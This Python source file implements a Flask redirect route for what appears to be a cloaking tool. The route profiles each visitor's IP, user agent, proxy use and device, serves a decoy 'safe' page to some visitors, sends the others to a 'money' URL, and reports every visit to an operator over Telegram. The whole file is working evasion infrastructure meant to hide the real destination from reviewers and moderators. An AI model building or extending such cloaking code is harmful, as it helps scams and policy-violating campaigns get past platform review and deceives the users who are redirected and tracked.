"""
Flask app exposing the cloaking redirect route.

GET /go/<token>
  → evaluates visitor via flow_engine
  → redirects to money or safe URL
  → fires Telegram notification scheduled on the bot's own event loop
"""
import asyncio
import logging
import os
from flask import Flask, redirect, request, abort, send_file

from db.models import link_get_flow
from core.flow_engine import evaluate
from bot.handlers.notify import send_visit_notification

logger = logging.getLogger(__name__)

_SAFE_PAGE = os.path.join(os.path.dirname(__file__), "..", "template", "safe_page.html")
_SAFE_PAGE = os.path.abspath(_SAFE_PAGE)

flask_app = Flask(__name__)

# Both injected by main.py after the PTB app is built
_bot = None
_bot_loop = None


def set_bot(bot, loop: asyncio.AbstractEventLoop):
    global _bot, _bot_loop
    _bot = bot
    _bot_loop = loop


@flask_app.route("/go/<token>")
def go(token: str):
    flow_name, domain = link_get_flow(token)
    if not flow_name:
        abort(404)

    ip         = request.headers.get("X-Forwarded-For", request.remote_addr)
    ip         = ip.split(",")[0].strip()
    user_agent = request.headers.get("User-Agent", "")

    result = evaluate(flow_name, domain, token, ip, user_agent)

    if _bot is not None and _bot_loop is not None and _bot_loop.is_running():
        asyncio.run_coroutine_threadsafe(
            send_visit_notification(
                _bot, flow_name, result.action, ip, result.ip_info,
                result.proxy, result.device_type, result.os,
            ),
            _bot_loop,
        )
    else:
        logger.warning("Notification skipped: bot loop not ready.")

    if result.action == "safe":
        return send_file(_SAFE_PAGE, mimetype="text/html")

    return redirect(result.redirect_url, code=302)
